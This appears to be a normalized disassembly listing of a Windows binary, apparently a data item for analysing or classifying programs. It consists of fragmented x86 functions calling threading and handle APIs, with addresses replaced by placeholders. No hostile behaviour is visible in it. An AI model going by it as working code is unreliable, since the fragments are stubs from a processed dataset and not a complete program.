pop esi
pop ebx
retn
sub_4111ba
jmp sub_4039f4
sub_4111c1
pop ebp
retn
sub_4111c4
sub [ rw-data ] 0x1
retn
sub_4111f1
jmp sub_4039f4
sub_4111f8
pop ebp
retn
sub_4111fc
sub [ rw-data ] 0x1
retn
sub_41261f
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a8b4
sub_412629
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a8d4
sub_412633
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_4129a0
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412ac4
mov eax [ eax + 0xc ]
call sub_413c88
retn
sub_412d9b
jmp sub_4039f4
sub_412da2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412da8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413e40
test eax eax
setge al
pop esi
pop ebx
retn
sub_4130ab
jmp sub_4039f4
sub_4130b2
mov esp ebp
pop ebp
retn
sub_413180
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41318c
push ebx
mov ebx edx
mov edx ebx
call sub_412fa0
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412d00
sub_413238
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413393
jmp sub_4039f4
sub_413467
jmp sub_4039f4
sub_413478
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4134e4
jmp sub_4039f4
sub_4134eb
pop ebx
mov esp ebp
pop ebp
retn
sub_413536
jmp sub_4039f4
sub_41353d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4135c9
jmp sub_4039f4
sub_4135d0
pop ebx
pop ebp
retn
sub_413616
jmp sub_4039f4
sub_41361d
pop ebx
pop ebp
retn
sub_413662
jmp sub_4039f4
sub_413669
pop ebx
pop ebp
retn
sub_4136b3
jmp sub_4039f4
sub_4136ba
pop esi
pop ebx
pop ebp
retn
sub_41370e
jmp sub_4039f4
sub_413715
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413842
jmp sub_4039f4
sub_413918
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413f80
sub_413a08
jmp sub_4039f4
sub_413b92
jmp sub_4039f4
sub_413b99
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413c33
jmp sub_4039f4
sub_413c3a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c59
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413c52
jmp sub_4039f4
sub_413c59
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413cbc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413fdc
xor edx edx
mov eax ebx
call sub_413fa0
pop ebx
retn
sub_413d34
mov eax [ ebp + 0x4 ]
retn
sub_413d6a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413db8
jmp sub_4039f4
sub_413dbf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413dc4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413ddc
xor edx edx
call sub_413de4
retn
sub_413ecc
mov edx [ eax + 0x8 ]
dec edx
call sub_413de4
retn
sub_414088
retn
sub_414142
jmp sub_4039f4
sub_414149
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403614
sub_4141d8
jmp sub_4039f4
sub_4141df
pop ebx
pop ecx
pop ebp
retn
sub_4141e4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41423b
jmp sub_4039f4
sub_414242
pop ebx
pop ecx
pop ebp
retn
sub_414248
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_414284
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
retn
sub_41429c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_414377
retn
sub_414378
cmp edx [ eax + 0x4 ]
jae sub_414284
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_414434
test edx edx
je r-xdata
xor edx edx
call sub_414448
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4144fe
jmp sub_4039f4
sub_414505
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414518
xchg edx eax
call sub_414448
retn
sub_414520
retn
sub_4145b9
jmp sub_4039f4
sub_4145c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41477d
jmp sub_4039f4
sub_414784
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414818
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_413e40
retn
sub_4148ed
jmp sub_4039f4
sub_4148f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414938
xor edx edx
call sub_4147f4
retn
sub_414990
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4149fa
jmp sub_4039f4
sub_414bc6
jmp sub_4039f4
sub_414bcd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bea
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_414be3
jmp sub_4039f4
sub_414bea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c74
jmp sub_4039f4
sub_414c8c
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414d48
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414df1
jmp sub_4039f4
sub_414df8
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e04
mov eax [ ebp + 0x4 ]
retn
sub_414e3a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414e88
jmp sub_4039f4
sub_414e8f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414f4e
jmp sub_4039f4
sub_414f55
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f77
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
sub_414f70
jmp sub_4039f4
sub_414f77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f80
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414f88
xor eax eax
retn
sub_414fd1
jmp sub_4039f4
sub_414fd8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4150eb
jmp sub_4039f4
sub_4150f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415180
jmp sub_4039f4
sub_415187
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415257
jmp sub_4039f4
sub_41525e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415314
jmp sub_4039f4
sub_41531b
pop esi
pop ecx
pop ebp
retn
sub_4153a0
jmp sub_4039f4
sub_4153a7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153c4
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_4153bd
jmp sub_4039f4
sub_4153c4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415450
jmp sub_4039f4
sub_41546d
jmp sub_4039f4
sub_415474
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4154b0
retn
sub_415533
jmp sub_4039f4
sub_41553a
mov eax [ ebp - 0x8 ]
call sub_418074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41555f
lea eax [ ebp - 0xc ]
call sub_404074
retn
sub_415558
jmp sub_4039f4
sub_41555f
mov esp ebp
pop ebp
retn
sub_4155af
jmp sub_4039f4
sub_4155b6
pop esi
pop ecx
pop ebp
retn
sub_415609
jmp sub_4039f4
sub_415610
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415618
retn
sub_415693
jmp sub_4039f4
sub_41569a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415737
jmp sub_4039f4
sub_41573e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41575b
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_415754
jmp sub_4039f4
sub_41575b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415760
retn
sub_4157da
jmp sub_4039f4
sub_4157e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4157e8
mov eax edx
mov edx ecx
call sub_407edc
retn
sub_4157f4
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41580c
sub_415884
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_4158f4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415910
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415b04
mov eax [ eax + 0x18 ]
retn
sub_415b08
mov eax [ eax + 0x14 ]
retn
sub_415ba4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415db0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415dec
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415e04
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415e18
mov edx sub_415e04
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415e60
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407edc
retn
mov eax edx
mov edx ecx
call sub_407ea4
retn
sub_415efc
retn
sub_4161f4
jmp sub_4039f4
sub_4161fb
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41625c
jmp sub_4039f4
sub_416263
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4162a8
mov eax [ eax + 0x4 ]
call sub_408434
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4162b8
mov eax [ eax + 0x4 ]
call sub_408460
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4162f4
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41649d
jmp sub_4039f4
sub_4164fc
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41658c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4165dc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4167c7
jmp sub_4039f4
sub_4167ce
mov esp ebp
pop ebp
retn
sub_416878
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
retn
sub_416900
mov [ eax + 0x18 ] edx
retn
sub_416a7c
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410bb0
retn
sub_416b03
jmp sub_4039f4
sub_416b0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416bb6
jmp sub_4039f4
sub_416bbd
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416d61
jmp sub_4039f4
sub_416db3
jmp sub_4039f4
sub_416dd2
jmp sub_4039f4
sub_416dd9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416df8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416df1
jmp sub_4039f4
sub_416df8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416e9b
jmp sub_4039f4
sub_416f23
jmp sub_4039f4
sub_416f30
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
pop ebx
retn
sub_416f48
mov eax [ rw-data ]
call sub_416f30
retn
sub_416f80
push ebx
call sub_410a68
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416f48
sub_4170ed
jmp sub_4039f4
sub_4170f4
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404074
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_417214
jmp sub_4039f4
sub_41721b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417312
jmp sub_4039f4
sub_41732f
jmp sub_4039f4
sub_417336
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417434
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415e7c
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_4174f8
push ebx
mov ebx eax
mov eax ebx
call sub_418eac
cmp al 0x9
sete al
pop ebx
retn
sub_417557
jmp sub_4039f4
sub_41755e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417604
jmp sub_4039f4
sub_41760b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417624
[ edi + 0x43070041 ]
sub_41788a
jmp sub_403740
sub_4178b6
jmp sub_403740
sub_417958
jmp sub_403740
sub_4179fb
jmp sub_403740
sub_417bd3
jmp sub_403740
sub_417c15
jmp sub_4039f4
sub_417c45
jmp sub_4039f4
sub_417c4c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417cbb
jmp sub_4039f4
sub_417d92
jmp sub_4039f4
sub_417d99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41806c
mov dl 0x1
call sub_416fd4
retn
sub_4181a4
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4181ad
jmp sub_4039f4
j_sub_4181a4
jmp sub_4181a4
sub_4181b4
pop ebx
mov esp ebp
pop ebp
retn
sub_4181bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418fbc
mov eax [ rw-data ]
call sub_416f30
pop ebp
retn
j_sub_40386c#5
jmp sub_40386c
j_sub_40386c#6
jmp sub_40386c
sub_4183a8
jmp sub_4039f4
sub_4183af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41848f
jmp sub_4039f4
sub_418496
mov esp ebp
pop ebp
retn
sub_41854e
jmp sub_4039f4
sub_418555
pop ecx
pop ecx
pop ebp
retn
sub_418857
jmp sub_4039f4
sub_41885e
pop ebx
mov esp ebp
pop ebp
retn
sub_418b03
jmp sub_4039f4
sub_418b0a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4032a0
retn
sub_418b23
jmp sub_4039f4
sub_418b47
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403740
sub_418b7e
jmp sub_403740
sub_418bbd
jmp sub_4039f4
sub_418bc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418be6
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404098
retn
sub_418bdf
jmp sub_4039f4
sub_418be6
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c6d
jmp sub_403740
sub_418c9a
jmp sub_4039f4
sub_418ca1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418cac
push ecx
mov edx esp
mov ecx 0x4
call sub_417470
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416f30
sub_418db9
jmp sub_4039f4
sub_418dc0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418e9f
jmp sub_4039f4
sub_418ea6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418efc
jmp sub_4039f4
sub_418f03
pop ebx
pop ecx
pop ebp
retn
sub_41914b
jmp sub_4039f4
sub_419152
pop ecx
pop ecx
pop ebp
retn
sub_419195
jmp sub_4039f4
sub_41919c
pop ebx
pop ecx
pop ebp
retn
sub_419238
jmp sub_4039f4
sub_41923f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4192ed
jmp sub_4039f4
sub_4192f4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419300
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41955b
jmp sub_4039f4
sub_419562
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419587
mov eax [ ebp - 0x8 ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_419580
jmp sub_4039f4
sub_419587
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195ac
lea eax [ ebp - 0x1c ]
call sub_4056e0
lea eax [ ebp - 0x18 ]
call sub_404074
retn
sub_4195a5
jmp sub_4039f4
sub_4195ac
pop ebx
mov esp ebp
pop ebp
retn
sub_4197be
jmp sub_4039f4
sub_4197c5
pop ebx
mov esp ebp
pop ebp
retn
sub_419818
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4160e0
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419830
test dl dl
je r-xdata
mov dl 0x8
call sub_4199b4
retn
mov dl 0x9
call sub_4199b4
retn
sub_4198b8
mov dl 0x1
call sub_4199b4
retn
sub_4198c0
xor edx edx
call sub_4199b4
retn
sub_4199a5
jmp sub_4039f4
sub_4199ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4199c8
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cac0
sub_4199fc
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419a14
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419a20
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419a14
sub_419a3c
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_419a48
push rw-data
call InterlockedIncrement
retn
sub_419a54
push rw-data
call InterlockedDecrement
retn
sub_419b6a
jmp sub_403740
sub_419b99
jmp sub_4039f4
sub_419bcf
jmp sub_4039f4
sub_419bd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bf5
push rw-data
call LeaveCriticalSection
retn
sub_419bee
jmp sub_4039f4
sub_419bf5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c41
jmp sub_403740
sub_419d52
jmp sub_4039f4
sub_419d59
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_419de0
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41a010
sub_419e5a
jmp sub_4039f4
sub_419e61
pop ebx
mov esp ebp
pop ebp
retn
sub_419e80
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_419e94
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_419e80
call sub_419fe8
sub_419f8d
jmp sub_4039f4
sub_419f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fb3
push rw-data
call LeaveCriticalSection
retn
sub_419fac
jmp sub_4039f4
sub_419fb3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_419fca
jmp sub_4039f4
sub_41a038
mov [ eax + 0xd ] 0x1
retn
sub_41a1a8
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41a384
sub_41a208
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417fbc
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41a21c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417fbc
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41a230
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419844
retn
sub_41a23c
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419844
retn
sub_41a4e4
xor eax eax
retn
sub_41a4e8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a4f0
xor eax eax
retn
sub_41a4f4
retn
sub_41a4f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040c8
pop esi
pop ebx
retn
sub_41a50c
mov eax [ eax + 0x4 ]
retn
sub_41a510
retn
sub_41a514
xor eax eax
retn
sub_41a518
retn
sub_41a51c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41a528
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41a534
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41a540
retn
sub_41a544
xchg edx eax
call sub_417c60
retn
sub_41a54c
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41a5d4
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40349c
pop esi
retn
sub_41a5e8
retn
sub_41a6c8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
sub_41a708
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a854
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034e8
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a86c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a8f4
retn
sub_41a93c
retn
sub_41a974
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a98c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41abb0
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40349c
pop esi
pop ebx
retn
sub_41a9d4
mov al 0x1
retn
sub_41a9d8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a9e0
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41aa88
xor eax eax
retn
sub_41aa8c
retn
sub_41aab8
retn
sub_41ab50
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41ab64
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413c88
retn
sub_41acab
jmp sub_403740
sub_41acb0
mov ebx 0x1
call sub_403aa8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ad13
jmp sub_403740
sub_41ad18
mov ebx 0x80030103
call sub_403aa8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ad96
jmp sub_403740
sub_41ad9b
mov ebx 0x80030009
call sub_403aa8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41adf9
jmp sub_403740
sub_41adfe
mov ebx 0x8000ffff
call sub_403aa8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41afc9
jmp sub_4039f4
sub_41afda
jmp sub_403740
sub_41afdf
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b008
lea eax [ ebp + 0xc ]
call sub_4056e0
retn
sub_41b001
jmp sub_4039f4
sub_41b008
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41b014
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41b020
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41b02c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41b038
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41b0a7
jmp sub_403740
sub_41b0ac
mov esi 0x8000ffff
call sub_403aa8
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b0c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41b12d
jmp sub_4039f4
sub_41b134
mov eax [ rw-data ]
call sub_4032a0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b144
call sub_4135d4
retn
sub_41b20c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41b3b0
jmp sub_4039f4
sub_41b3b7
pop ebp
retn
sub_41b445
jmp sub_4039f4
sub_41b44c
pop ebp
retn
sub_41b755
jmp sub_4039f4
sub_41b75c
pop ebp
retn
sub_41b760
sub [ rw-data ] 0x1
retn
sub_41c670
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41c6e4
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41c758
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41c764
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41c844
jmp sub_4039f4
sub_41c84b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c8db
jmp sub_4039f4
sub_41c96d
jmp sub_4039f4
sub_41c974
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c9d8
jmp sub_4039f4
sub_41c9df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ca47
jmp sub_4039f4
sub_41ca4e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41caf1
jmp sub_4039f4
sub_41caf8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cf50
push 0x33
mov ecx rw-data
call sub_413894
retn
sub_41cf60
push 0x33
mov ecx rw-data
call sub_413854
retn
sub_41cf70
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41cf94
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41d168
push 0x11
mov ecx rw-data
call sub_413854
retn
sub_41d2a8
push ebx
mov ebx eax
mov eax ebx
call sub_41cf70
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d362
